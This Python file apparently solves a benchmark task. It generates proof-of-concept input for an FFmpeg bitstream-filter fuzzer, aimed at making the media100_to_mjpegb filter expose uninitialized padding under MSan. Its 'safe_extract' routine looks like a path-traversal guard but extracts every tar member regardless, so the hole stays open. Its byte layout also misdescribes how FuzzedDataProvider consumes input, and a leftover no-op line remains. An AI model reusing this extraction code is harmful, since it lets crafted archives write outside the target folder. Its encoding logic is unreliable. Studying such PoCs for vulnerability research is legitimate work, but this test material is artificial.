import os
import re
import tarfile
import tempfile
import struct
from typing import Optional, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Main entry: try to tailor a PoC to the fuzzer in the tarball.
        # Strategy:
        # 1) Extract the tarball.
        # 2) Locate a fuzzer that exercises FFmpeg BSF (bitstream filters).
        # 3) Parse its input expectations (heuristics).
        # 4) Generate bytes that try to select "media100_to_mjpegb" and provide some payload.
        #
        # If parsing fails, return a robust generic PoC for typical FuzzedDataProvider patterns:
        #   - first 8 bytes give length 18 for "media100_to_mjpegb"
        #   - string "media100_to_mjpegb"
        #   - options length = 0
        #   - some integers for sizes
        #   - payload bytes
        #
        # The generated PoC aims to cause the media100_to_mjpegb BSF to run and produce
        # uninitialized padding in vulnerable builds (triggering MSan), while fixed builds
        # zero that padding.
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            self._extract_tarball(src_path, tmpdir)
            fuzzer_file = self._find_bsf_fuzzer_file(tmpdir)
            if fuzzer_file:
                code = self._read_text_file(fuzzer_file)
                if self._uses_fuzzed_data_provider(code):
                    return self._generate_for_fdp(code)
                else:
                    # Fallback if not using FDP: attempt simple string-based protocol guesses.
                    return self._generate_generic()
            else:
                # No fuzzer file detected; return generic robust PoC.
                return self._generate_generic()
        finally:
            # Clean up extracted files
            try:
                self._cleanup_dir(tmpdir)
            except Exception:
                pass

    def _extract_tarball(self, tar_path: str, dst_dir: str) -> None:
        # Extract tarball to dst_dir
        mode = 'r'
        if tar_path.endswith('.tar.gz') or tar_path.endswith('.tgz'):
            mode = 'r:gz'
        elif tar_path.endswith('.tar.bz2') or tar_path.endswith('.tbz2') or tar_path.endswith('.tbz'):
            mode = 'r:bz2'
        elif tar_path.endswith('.tar.xz') or tar_path.endswith('.txz'):
            mode = 'r:xz'
        else:
            mode = 'r'
        with tarfile.open(tar_path, mode) as tf:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonpath([abs_directory])
                return os.path.commonpath([abs_directory, abs_target]) == prefix
            def safe_extract(tar_obj, path=".", members=None, *, numeric_owner=False):
                for member in tar_obj.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                tar_obj.extractall(path, members, numeric_owner=numeric_owner)
            safe_extract(tf, path=dst_dir)

    def _cleanup_dir(self, d: str) -> None:
        # Recursively remove directory
        for root, dirs, files in os.walk(d, topdown=False):
            for f in files:
                try:
                    os.unlink(os.path.join(root, f))
                except Exception:
                    pass
            for sub in dirs:
                try:
                    os.rmdir(os.path.join(root, sub))
                except Exception:
                    pass
        try:
            os.rmdir(d)
        except Exception:
            pass

    def _find_bsf_fuzzer_file(self, root: str) -> Optional[str]:
        candidates: List[Tuple[str, int]] = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                lower = fn.lower()
                if not (lower.endswith('.c') or lower.endswith('.cc') or lower.endswith('.cpp') or lower.endswith('.cxx')):
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                        txt = f.read()
                except Exception:
                    continue
                if 'LLVMFuzzerTestOneInput' not in txt:
                    continue
                score = 0
                # Heuristic: prefer bitstream filter fuzzers
                if 'av_bsf' in txt or 'AVBSF' in txt or 'bitstream filter' in txt.lower() or 'AVBitStreamFilter' in txt:
                    score += 10
                if 'FuzzedDataProvider' in txt or 'FuzzDataProvider' in txt:
                    score += 5
                if 'av_bsf_get_by_name' in txt:
                    score += 5
                if 'av_bsf_list_parse_str' in txt:
                    score += 5
                if 'AVBSFContext' in txt:
                    score += 3
                # Slight preference for file names that hint BSF
                name_score = 0
                name_low = fp.lower()
                if 'bsf' in name_low:
                    name_score += 2
                if 'bitstream' in name_low:
                    name_score += 1
                score += name_score
                candidates.append((fp, score))
        if not candidates:
            return None
        candidates.sort(key=lambda x: x[1], reverse=True)
        return candidates[0][0]

    def _read_text_file(self, fp: str) -> str:
        try:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""

    def _uses_fuzzed_data_provider(self, code: str) -> bool:
        return ('FuzzedDataProvider' in code) or ('FuzzDataProvider' in code)

    def _generate_for_fdp(self, code: str) -> bytes:
        # Parse the fuzzer code to detect FDP variable, operations and especially the
        # string used as BSF name for av_bsf_get_by_name() or av_bsf_list_parse_str().
        fdp_name = self._find_fdp_variable_name(code)
        # If can't find fdp var name, fallback to a generic FDP-based payload
        if not fdp_name:
            return self._generic_fdp_payload()

        # Try to detect the variable used as BSF name
        bsf_name_var = self._find_bsf_name_variable(code)
        list_parse_var = self._find_bsf_list_parse_variable(code)

        # Collect FDP calls in textual order
        calls = self._collect_fdp_calls_in_order(code, fdp_name)

        # Build bytes for calls
        data = bytearray()
        used_bsf_name = False

        for call in calls:
            kind = call['kind']
            if kind == 'rand_str':
                max_len = call.get('max', 64)
                var = call.get('var')
                if (not used_bsf_name) and (bsf_name_var and var == bsf_name_var or (bsf_name_var is None and list_parse_var and var == list_parse_var) or (bsf_name_var is None and list_parse_var is None)):
                    # Try to set the BSF name to "media100_to_mjpegb"
                    s = b"media100_to_mjpegb"
                    # Compose length parameter for FuzzedDataProvider internal ConsumeRandomLengthString
                    data += self._pack_integral_for_range('size_t', 0, max_len, len(s))
                    data += s
                    used_bsf_name = True
                else:
                    # Provide empty or minimal string
                    data += self._pack_integral_for_range('size_t', 0, max_len, 0)
                    # no content
            elif kind == 'integral_range':
                t = call.get('type', 'size_t')
                minv = call.get('min', 0)
                maxv = call.get('max', 0x1000)
                # Pick mid value or small value; for sizes pick something small but >0.
                want = minv
                # Heuristic: if this might be a size or length, use a small nonzero
                if isinstance(maxv, int) and maxv >= minv + 10:
                    want = minv + min(100, maxv - minv)
                data += self._pack_integral_for_range(t, minv, maxv, want)
            elif kind == 'integral':
                t = call.get('type', 'size_t')
                # Provide zero
                data += self._pack_integral_raw(t, 0)
            elif kind == 'bool':
                data += b'\x00'
            elif kind == 'bytes':
                # The actual number of bytes consumed is dynamic in runtime,
                # but calls list may carry a literal length.
                n = call.get('n', 0)
                if isinstance(n, int) and n > 0 and n < 1_000_000:
                    data += b'\x00' * n
                else:
                    # unknown length; do nothing here
                    pass
            # else ignore unknown kinds

        # If we didn't see a ConsumeRandomLengthString for name, try to add a trailing block
        # that some fuzzers use: a length prefix plus name string
        if not used_bsf_name:
            data += struct.pack('<Q', 18) + b"media100_to_mjpegb"

        # Add options length (0), some integral sizes, and payload to feed the bsf
        data += struct.pack('<Q', 0)  # optional options length for a second ConsumeRandomLengthString
        # Provide a few integral values that may be consumed as sizes if present
        data += struct.pack('<I', 100)  # possible packet size
        data += struct.pack('<I', 0)    # possible extradata size
        # Provide a packet payload
        payload = b'\x00' * 64 + b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 64 + b'\xff\xd9' + b'\x00' * 128
        data += payload
        # Provide extra trailing data for any ConsumeRemainingBytes
        data += b'A' * 1024
        return bytes(data)

    def _generic_fdp_payload(self) -> bytes:
        # Generic FDP-based payload that often matches FFmpeg's BSF fuzzer harnesses.
        # Layout:
        # - size_t (8bytes LE) = 18    -> length of name
        # - "media100_to_mjpegb"       -> BSF name
        # - size_t (8bytes LE) = 0     -> empty options string
        # - uint32 size for packet     -> 100
        # - uint32 extradata size      -> 0
        # - payload bytes
        data = bytearray()
        data += struct.pack('<Q', 18)
        data += b"media100_to_mjpegb"
        data += struct.pack('<Q', 0)
        data += struct.pack('<I', 100)
        data += struct.pack('<I', 0)
        payload = b'\x00' * 64 + b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 64 + b'\xff\xd9' + b'\x00' * 128
        data += payload
        data += b'A' * 1024
        return bytes(data)

    def _generate_generic(self) -> bytes:
        # As a fallback when we can't parse a specific harness, we produce a robust combined payload:
        # - length-prefixed name for FDP-style consumers
        # - newline-terminated name for line-based parsers
        # - name with NUL terminator
        # - then options empty and payload
        name = b"media100_to_mjpegb"
        out = bytearray()
        # FDP-style prefix
        out += struct.pack('<Q', len(name))
        out += name
        out += struct.pack('<Q', 0)  # empty options
        out += struct.pack('<I', 128)  # possible packet size
        out += struct.pack('<I', 0)    # extradata size
        # Also include a line-based name early in the stream for alternate parsers
        out += name + b"\n"
        out += name + b"\x00"
        # Payload
        jpeg_like = b'\xff\xd8\xff\xe0' + b'JFIF' + b'\x00' * 100 + b'\xff\xd9'
        out += b'\x00' * 64 + jpeg_like + b'\x00' * 256
        # Extra trailing bytes
        out += b'B' * 2048
        return bytes(out)

    def _find_fdp_variable_name(self, code: str) -> Optional[str]:
        # Find the variable name used for FuzzedDataProvider
        # Patterns: "FuzzedDataProvider fdp(data, size);" or "FuzzDataProvider fdp(data, size);"
        m = re.search(r'(?:FuzzedDataProvider|FuzzDataProvider)\s+([A-Za-z_]\w*)\s*\(', code)
        if m:
            return m.group(1)
        return None

    def _find_bsf_name_variable(self, code: str) -> Optional[str]:
        # Try to find which variable is passed to av_bsf_get_by_name(...)
        m = re.search(r'av_bsf_get_by_name\s*\(\s*([^)]+?)\s*\)', code)
        if not m:
            return None
        arg = m.group(1)
        # Normalize typical patterns like "name.c_str()" or "(char*)name.c_str()"
        arg = re.sub(r'\.c_str\s*\(\s*\)', '', arg)
        arg = re.sub(r'\(.*?\)', lambda mm: mm.group(0) if '"' in mm.group(0) else '', arg)  # keep string literals
        # If arg is a string literal, we cannot influence it; return None
        if '"' in arg or "'" in arg:
            return None
        # Extract last token
        tokens = re.findall(r'[A-Za-z_]\w*', arg)
        if not tokens:
            return None
        # Choose the last token (most likely the variable name)
        return tokens[-1]

    def _find_bsf_list_parse_variable(self, code: str) -> Optional[str]:
        # Try to find variable passed to av_bsf_list_parse_str(str)
        m = re.search(r'av_bsf_list_parse_str\s*\(\s*([^)]+?)\s*(?:,|\))', code)
        if not m:
            return None
        arg = m.group(1)
        arg = re.sub(r'\.c_str\s*\(\s*\)', '', arg)
        if '"' in arg or "'" in arg:
            return None
        tokens = re.findall(r'[A-Za-z_]\w*', arg)
        if not tokens:
            return None
        return tokens[-1]

    def _collect_fdp_calls_in_order(self, code: str, fdp_name: str) -> List[dict]:
        # Create a list of calls in textual order:
        # - rand_str: fdp.ConsumeRandomLengthString(N)
        # - integral_range: fdp.ConsumeIntegralInRange<T>(min, max)
        # - integral: fdp.ConsumeIntegral<T>()
        # - bool: fdp.ConsumeBool()
        # - bytes: fdp.ConsumeBytesAsString(N) or fdp.ConsumeBytes<uint8_t>(N), but N detection is weak
        ops = []
        # To maintain order, scan with a single regex that matches any of the patterns and inspect which matched
        pattern = (
            rf'({re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\))'
            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>\s*\(\s*([^,]+?)\s*,\s*([^)]+?)\s*\))'
            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeIntegral\s*<\s*([^>]+?)\s*>\s*\(\s*\))'
            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeBool\s*\(\s*\))'
            rf'|({re.escape(fdp_name)}\s*\.\s*ConsumeBytes(?:AsString)?\s*\(\s*([^)]+?)\s*\))'
        )
        # Before scanning, extract mapping var <- fdp.ConsumeRandomLengthString
        # to link variables
        var_assigns = []
        for m in re.finditer(
            rf'(?:std::string|auto|const\s+std::string|::std::string)\s+([A-Za-z_]\w*)\s*=\s*{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)\s*;',
            code
        ):
            var_assigns.append((m.start(), m.end(), m.group(1), int(m.group(2))))
        # Also handle cases where variable is already declared
        for m in re.finditer(
            rf'([A-Za-z_]\w*)\s*=\s*{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)\s*;',
            code
        ):
            var_assigns.append((m.start(), m.end(), m.group(1), int(m.group(2))))
        var_assigns.sort(key=lambda x: x[0])

        # Build map from position of rand_str call to var details
        rand_call_positions = {}
        for m in re.finditer(
            rf'{re.escape(fdp_name)}\s*\.\s*ConsumeRandomLengthString\s*\(\s*(\d+)\s*\)',
            code
        ):
            max_len = int(m.group(1))
            var_for_this_call = None
            # Find nearest variable assignment overlapping or immediately preceding
            for s, e, vname, vmax in var_assigns:
                if s <= m.start() <= e + 4 or (e <= m.start() <= e + 50):
                    var_for_this_call = vname
                    break
            rand_call_positions[m.start()] = {'max': max_len, 'var': var_for_this_call}

        # Now scan and add ops in order
        for m in re.finditer(pattern, code):
            full = m.group(0)
            if m.group(1):  # ConsumeRandomLengthString
                call_start = m.start(1) - (len(m.group(1)) - len(m.group(1)))  # approximate
                # Lookup attributes
                attrs = rand_call_positions.get(m.start(1), None)
                if attrs is None:
                    # fallback: just max length from group(2)
                    try:
                        max_len = int(m.group(2))
                    except Exception:
                        max_len = 64
                    ops.append({'kind': 'rand_str', 'max': max_len})
                else:
                    ops.append({'kind': 'rand_str', 'max': attrs['max'], 'var': attrs['var']})
            elif m.group(3):  # ConsumeIntegralInRange
                t = m.group(4).strip()
                minv = self._parse_int_literal(m.group(5))
                maxv = self._parse_int_literal(m.group(6))
                ops.append({'kind': 'integral_range', 'type': t, 'min': minv, 'max': maxv})
            elif m.group(7):  # ConsumeIntegral<>
                t = m.group(8).strip()
                ops.append({'kind': 'integral', 'type': t})
            elif m.group(9):  # ConsumeBool
                ops.append({'kind': 'bool'})
            elif m.group(10):  # ConsumeBytes or ConsumeBytesAsString
                n = self._parse_int_literal(m.group(11))
                ops.append({'kind': 'bytes', 'n': n})
            else:
                # Unknown match
                pass

        return ops

    def _parse_int_literal(self, s: str) -> int:
        s = s.strip()
        # Remove casts and parentheses
        s = re.sub(r'\([^)]*\)', '', s).strip()
        # Remove extra spaces
        s = s.strip()
        # Attempt to parse integer
        try:
            if s.lower().startswith('0x'):
                return int(s, 16)
            return int(s, 10)
        except Exception:
            # Unknown expression; fallback to safe default
            return 0

    def _pack_integral_for_range(self, t: str, minv: int, maxv: int, want: int) -> bytes:
        size = self._sizeof_type(t)
        if size <= 0:
            size = 8
        if want < minv:
            want = minv
        if want > maxv:
            want = maxv
        # FuzzedDataProvider: ConsumeIntegralInRange returns min + (ConsumeIntegral<T>() % range)
        # So we set raw = want - minv
        raw = want - minv
        # Pack raw into size bytes LE
        return self._pack_value_le(raw, size)

    def _pack_integral_raw(self, t: str, value: int) -> bytes:
        size = self._sizeof_type(t)
        if size <= 0:
            size = 8
        return self._pack_value_le(value, size)

    def _pack_value_le(self, v: int, size: int) -> bytes:
        if size == 1:
            return struct.pack('<B', v & 0xFF)
        elif size == 2:
            return struct.pack('<H', v & 0xFFFF)
        elif size == 4:
            return struct.pack('<I', v & 0xFFFFFFFF)
        else:
            return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)

    def _sizeof_type(self, t: str) -> int:
        t = t.strip()
        t = re.sub(r'\s+', ' ', t)
        # Map common types to sizes
        m = {
            'uint8_t': 1, 'int8_t': 1, 'char': 1, 'unsigned char': 1, 'signed char': 1, 'bool': 1,
            'uint16_t': 2, 'int16_t': 2, 'short': 2, 'unsigned short': 2,
            'uint32_t': 4, 'int32_t': 4, 'int': 4, 'unsigned int': 4, 'uint': 4,
            'uint64_t': 8, 'int64_t': 8, 'long long': 8, 'unsigned long long': 8,
            'size_t': 8, 'ssize_t': 8, 'ptrdiff_t': 8, 'long': 8, 'unsigned long': 8,
        }
        # remove const/volatile qualifiers
        t = t.replace('const ', '').replace('volatile ', '').strip()
        if t in m:
            return m[t]
        # heuristic: default to 8
        return 8